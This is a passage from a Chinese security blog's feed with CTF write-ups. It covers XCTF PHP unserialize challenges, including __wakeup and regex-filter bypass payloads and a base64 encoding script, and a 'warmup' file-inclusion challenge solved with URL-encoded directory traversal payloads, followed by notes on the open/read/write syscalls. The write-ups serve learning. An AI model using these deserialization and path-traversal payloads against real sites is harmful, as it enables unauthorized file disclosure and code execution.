class="headerlink" title="2.题目分析"></a><code>2.题目分析</code></h4><blockquote><p>这里需要进行反序列化，并且要绕过 <code>__wakeup</code> 魔术函数，这里需要的知识点有：</p><ol><li>将数据序列化后的数据格式是什么样子？</li><li>如何绕过<code>__wakeup</code>函数？</li></ol></blockquote><h4 id="3-构造payload"><a href="#3-构造payload" class="headerlink" title="3.构造payload"></a><code>3.构造payload</code></h4><p>从上面的基础知识可以得到序列化后的数据格式，并且<code>当对象的属性(变量)数大于实际的个数时，__wakeup()魔法函数被绕过</code>，那么这里我们就可以构造出payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;,s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure><p>得到如下flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the answer is : cyberpeace&#123;7d67cd73e3c53d91d218d6a75563f5e3&#125;</span><br></pre></td></tr></table></figure><h3 id="【XCTF-web】Web-php-unserialize27"><a href="#【XCTF-web】Web-php-unserialize27" class="headerlink" title="【XCTF-web】Web_php_unserialize27"></a><font color="blue"><code>【XCTF-web】Web_php_unserialize27</code></font></h3><h4 id="1-题目描述-2"><a href="#1-题目描述-2" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-题目分析-1"><a href="#2-题目分析-1" class="headerlink" title="2.题目分析"></a><code>2.题目分析</code></h4><p>我们一部分一部分的分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var = base64_decode($_GET[<span class="string">'var'</span>]);</span><br></pre></td></tr></table></figure><blockquote><p>对我们输入的payload进行base64解码，也就是说我们输入的payload要经过base64编码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var))</span><br></pre></td></tr></table></figure><blockquote><p>也就是说我们解码后的输入的形式如果是<code>[oc]:\d+:</code>（不区分大小写）则会输出<code>stop hacking</code>，但是如果我们的输入是<code>O:+4:</code>，就可以绕过正则过滤</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@unserialize($var);</span><br></pre></td></tr></table></figure><blockquote><p>反序列化我们的var值</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><blockquote><p>如果执行反序列化，那么就得执行该函数，所以和上一道题目一样，我们需要绕过该函数。</p></blockquote><h4 id="3-构造payload-1"><a href="#3-构造payload-1" class="headerlink" title="3.构造payload"></a><code>3.构造payload</code></h4><p>根据上文分析，我们可以构造如下的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+<span class="number">4</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">"\x00Demo\x00file"</span>;s:<span class="number">8</span>:<span class="string">"fl4g.php"</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>但是我们需要将其进行base64编码，这里就需要注意一个常见的坑，就是<code>private</code>属性的名字填写，两边要有两个<code>\x00</code>，这个时候我们不能直接将其进行base64编码，所以我们要将其用十六进制形式打开，改掉里面的内容，或者用下面的脚本进行修改：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"2.txt"</span>,<span class="string">"r+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        line = line.strip(<span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(line)):</span><br><span class="line">            s += line[i]</span><br><span class="line">            <span class="keyword">if</span> i &lt; len(line) - <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> (line[i+<span class="number">1</span>] == <span class="string">"D"</span> <span class="keyword">and</span> line[i<span class="number">-2</span>] == <span class="string">"0"</span>) <span class="keyword">or</span> (line[i] == <span class="string">"o"</span> <span class="keyword">and</span> line[i+<span class="number">1</span>] == <span class="string">"f"</span>):</span><br><span class="line">                    s += chr(int(<span class="string">"0x00"</span>,<span class="number">16</span>))</span><br><span class="line">                    print(<span class="string">"1"</span>)</span><br><span class="line">    print(base64.b64encode(bytes(s,encoding=<span class="string">"gbk"</span>)))</span><br></pre></td></tr></table></figure></p><p>得到如下flag：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-文件包含问题"><a href="#0x02-文件包含问题" class="headerlink" title="0x02 文件包含问题"></a><font color="navy"><code>0x02 文件包含问题</code></font></h2><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a><font color="blue"><code>基础知识</code></font></h3><p><a href="https://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="noopener">参考链接</a></p><blockquote><p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。注意：<code>如果被包含的文件中无有效的php代码，则会直接把文件内容输出。</code></p><p>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。常见包含函数有：<code>include()</code>、<code>require()</code>，这两者的区别有：</p><ol><li><code>include</code> 是当代码执行到它的时候才加载文件，发生错误的时候只是给一个警告，然后继续往下执行</li><li><code>require</code> 是只要程序一执行就会立即调用文件，发生错误的时候会输出错误信息，并且终止脚本的运行</li></ol><p>require一般是用于文件头包含类文件、数据库等等文件，include一般是用于包含html模版文件<br>include_once()、require_once()与(include\require)的功能相同，只是区别于当重复调用的时候，它只会调用一次</p></blockquote><h3 id="【XCTF-web】warmup"><a href="#【XCTF-web】warmup" class="headerlink" title="【XCTF-web】warmup"></a><font color="blue"><code>【XCTF-web】warmup</code></font></h3><h4 id="1-题目描述-3"><a href="#1-题目描述-3" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><p><img src="/images/142-3.png" alt></p><blockquote><p>从上图可以看出，题目给出的网址打开之后只出现一个大大的笑脸，F12打开源码看见被注释掉了一段“source.php”，我们下面打开该网址，得到如下PHP源码：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-题目分析-2"><a href="#2-题目分析-2" class="headerlink" title="2.题目分析"></a><code>2.题目分析</code></h4><p>我们从上文源码中可以看到，还有一个<code>hint.php</code>文件，我们打开一下看看里面有什么提示信息，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><blockquote><p>从上文可以看出我们要的flag在ffffllllaaaagggg文件中，那么我们可能需要遍历目录查找该文件。</p></blockquote><p>下面我们分析上面的PHP源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>]) &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>]) &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>]))</span><br></pre></td></tr></table></figure><blockquote><p>如果同时满足上述三个条件，即可执行文件包含漏洞，这三个条件分别是：</p><ol><li>输入的字符串要为非空（因为如果输入的字符串是非空，empty返回False，那么!empty是True）</li><li>is_string()：要求输入的是字符串是字符串</li><li>要满足checkFile函数返回的是True</li></ol><p>下面我们就分析一下checkFile，我们要使得他的返回值为True</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>要求我们的输入为非空字符串</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>要求我们输入的字符串要为source.php或者hint.php，否则不执行。这里是第一个返回True的地方，我们先记为 ①</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">$page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>首先会执行<code>mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</code>，该函数会返回输入字符串之后加上<code>?</code>之后的首次出现<code>?</code>的位置，<code>mb_substr</code>函数会返回我们输入字符串从0到首次出现?之前的字符串，如果该字符串有”source.php”或者”index.php”则返回true，这里我们记为②</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">$_page = mb_substr(</span><br><span class="line">$_page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>会对我们输入的payload进行url解码，然后执行同上的操作，然后返回true，这里我们记为③</p></blockquote><h4 id="3-构造payload-2"><a href="#3-构造payload-2" class="headerlink" title="3.构造payload"></a><code>3.构造payload</code></h4><p>根据第2部分的分析，要想能够输入我们的payload，我们可以使得checkFile函数返回true的地方只有②和③</p><p>② 处的payload为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?(payload) 或者为 ?file=source.php%3F(payload)</span><br></pre></td></tr></table></figure><p>③ 处的payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php%253F(payload)</span><br></pre></td></tr></table></figure><p>下面就是如何确定在哪个目录下，这就需要我们一个一个进行尝试了，在尝试之后发现<code>ffffllllaaaagggg</code>在/../../../../ffffllllaaaagggg中，所以payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?/../../../../ffffllllaaaagggg</span><br><span class="line">?file=source.php%3F/../../../../ffffllllaaaagggg</span><br><span class="line">?file=source.php%253F/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><h4 id="4-目录遍历问题"><a href="#4-目录遍历问题" class="headerlink" title="4.目录遍历问题"></a><code>4.目录遍历问题</code></h4><p>经过测试发现并确定，这种包含的前提是<code>包含的文件必须是当前文件夹不存在的文件</code>，<strong>只有这样才会将该文件解析成目录</strong>，从而遍历其他文件；此处<font color="navy"><strong>hint.php?被解析认为是一个目录，但该目录并不存在，因此第一次<code>../</code>仅仅又是回到当前source.php的目录下</strong></font>。</p><div class="table-container"><table><thead><tr><th style="text-align:left">目录遍历</th><th style="text-align:left">解析</th></tr></thead><tbody><tr><td style="text-align:left">../</td><td style="text-align:left">/var/www/html</td></tr><tr><td style="text-align:left">../../</td><td style="text-align:left">/var/www</td></tr><tr><td style="text-align:left">../../../</td><td style="text-align:left">/var</td></tr><tr><td style="text-align:left">../../../../</td><td style="text-align:left">/</td></tr></tbody></table></div><p>此外，在<code>Windows</code>下<code>hint.php?</code>无法被解析为目录，在<code>linux</code>下成功认为是目录，原因为Windows系统文件命名不支持问号。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-函数漏洞问题&quot;&gt;&lt;a href=&quot;#0x00-函数漏洞问题&quot; class=&quot;headerlink&quot; title=&quot;0x00 函数漏洞问题&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 函数漏洞问题&lt;/code&gt;&lt;/font&gt;&lt;/h
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="PHP" scheme="https://muzibing.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CTF中常见的函数总结</title>
    <link href="https://muzibing.github.io/2020/07/27/2020.07.27%EF%BC%88141%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/27/2020.07.27（141）/</id>
    <published>2020-07-26T16:00:00.000Z</published>
    <updated>2020-07-27T10:54:59.838Z</updated>
    
    <content type="html"><![CDATA[<h2 id="font-color-navy0x00-pwn题font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-pwn题font"></a> <font color="navy"><code>0x00 pwn题</code></font></h2><h3 id="font-color-blue1open函数font"><a class="markdownIt-Anchor" href="#font-color-blue1open函数font"></a> <font color="blue"><code>1.open()函数</code></font></h3><h4 id="函数原型"><a class="markdownIt-Anchor" href="#函数原型"></a> <code>函数原型</code></h4><blockquote><p><code>int open(const char *path, int flags,int mode)；</code></p></blockquote><p><code>flags</code></p><table><thead><tr><th style="text-align:center">常量名称</th><th style="text-align:center">数字</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">O_RDONLY</td><td style="text-align:center">0</td><td style="text-align:center">只读模式</td></tr><tr><td style="text-align:center">O_WRONLY</td><td style="text-align:center">1</td><td style="text-align:center">只写模式</td></tr><tr><td style="text-align:center">O_RDWR</td><td style="text-align:center">2</td><td style="text-align:center">可读可写</td></tr></tbody></table><h4 id="函数功能"><a class="markdownIt-Anchor" href="#函数功能"></a> <code>函数功能</code></h4><blockquote><p>以各种方式打开文件</p></blockquote><h4 id="函数返回值"><a class="markdownIt-Anchor" href="#函数返回值"></a> <code>函数返回值</code></h4><blockquote><p>如果调用成功，它将返回一个可以被<code>read</code>和<code>write</code>等其他系统调用使用的<font color="red"><code>文件描述符</code></font>。这个文件描述符是唯一的。它不会与任何其他运行中的进程共享，除非是fork了子进程。如果两个进程同时打开一个文件，他们会分别得到两个不同的文件描述符。如果他们都对文件进行写操作，那么他们会各写各的，它们分别接着自己上次离开的位置继续往下写，数据不会交织在一起，而是会彼此覆盖。我们可以使用文件锁功能来防止这种事件。’</p></blockquote><p><code>返回的文件描述符</code></p><blockquote><p>fd的值一般是<code>3</code>开始，依次增加。比如我open了两个文件，那么它们的fd分别为3和4。</p></blockquote><h4 id="系统调用号"><a class="markdownIt-Anchor" href="#系统调用号"></a> <code>系统调用号</code></h4><blockquote><p><code>2 open sys_open fs/open.c</code></p></blockquote><h3 id="font-color-blue2read函数font"><a class="markdownIt-Anchor" href="#font-color-blue2read函数font"></a> <font color="blue"><code>2.read()函数</code></font></h3><h4 id="头文件"><a class="markdownIt-Anchor" href="#头文件"></a> <code>头文件</code></h4><blockquote><p><code>#include&lt;unistd.h&gt;</code></p></blockquote><h4 id="函数原型-2"><a class="markdownIt-Anchor" href="#函数原型-2"></a> <code>函数原型</code></h4><blockquote><p><code>ssize_t read(int fd, void *buf, size_t count);</code></p></blockquote><h4 id="函数功能-2"><a class="markdownIt-Anchor" href="#函数功能-2"></a> <code>函数功能</code></h4><blockquote><p>读取文件内容：<strong>read()会把参数<code>fd</code>所指的文件传送 <code>count</code>个字节到buf 指针所指的内存中</strong>。</p></blockquote><h4 id="函数返回值-2"><a class="markdownIt-Anchor" href="#函数返回值-2"></a> <code>函数返回值</code></h4><blockquote><p>参数count 为0，则read()不会有作用并返回0。返回值为实际读取到的字节数, 如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动：</p><ul><li>当文件的整体字节比<code>count</code>小时，读到文件尾、从管道(pipe)或终端机读取、我们读取时被一个信号打断了等等情况。</li><li>当有错误发生时则返回-1, 错误代码存入errno 中, 而文件读写位置则无法预期。</li></ul></blockquote><h4 id="测试用例"><a class="markdownIt-Anchor" href="#测试用例"></a> <code>测试用例</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>] =<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">int</span> fp = open(<span class="string">"./test.txt"</span>, O_RDONLY);<span class="comment">//只读模式打开文件</span></span><br><span class="line">    res = read(fp,buffer,<span class="number">60</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"read %d bits,they are %s\n"</span>,res,buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,strerror(errno));</span><br><span class="line">    close(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="系统调用号-2"><a class="markdownIt-Anchor" href="#系统调用号-2"></a> <code>系统调用号</code></h4><blockquote><p><code>0 read sys_read fs/read_write.c</code></p></blockquote><h3 id="font-color-blue3write函数font"><a class="markdownIt-Anchor" href="#font-color-blue3write函数font"></a> <font color="blue"><code>3.write()函数</code></font></h3><h4 id="头文件-2"><a class="markdownIt-Anchor" href="#头文件-2"></a> <code>头文件</code></h4><blockquote><p><code>#include&lt;unistd.h&gt;</code></p></blockquote><h4 id="函数原型-3"><a class="markdownIt-Anchor" href="#函数原型-3"></a> <code>函数原型</code></h4><blockquote><p><code>ssize_t write(int fd,const void *buf, size_t count);·</code></p><ul><li><strong>fd</strong>：是文件描述符（write所对应的是写，即就是1，这是标准输出）</li><li><strong>buf</strong>：通常是一个字符串，需要写入的字符串</li><li><strong>count</strong>：是每次写入的字节数</li></ul></blockquote><h4 id="函数功能-3"><a class="markdownIt-Anchor" href="#函数功能-3"></a> <code>函数功能</code></h4><blockquote><p>打印文件内容</p></blockquote><h4 id="函数返回值-3"><a class="markdownIt-Anchor" href="#函数返回值-3"></a> <code>函数返回值</code></h4><blockquote><ul><li><p>成功：返回读出的字节数</p></li><li><p>失败：返回-1，并设置errno，如果在调用 read 之前到达文件末尾，则这次read返回 0</p></li></ul></blockquote><h4 id="系统调用号-3"><a class="markdownIt-Anchor" href="#系统调用号-3"></a> <code>系统调用号</code></h4><blockquote><p><code>1 write sys_write fs/read_write.c</code></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;font-color-navy0x00-pwn题font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-pwn题font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 p
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PHP伪协议总结</title>
    <link href="https://muzibing.github.io/2020/07/25/2020.07.25%EF%BC%88140%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/25/2020.07.25（140）/</id>
    <published>2020-07-24T16:00:00.000Z</published>
    <updated>2020-07-25T07:00:53.610Z</updated>
    
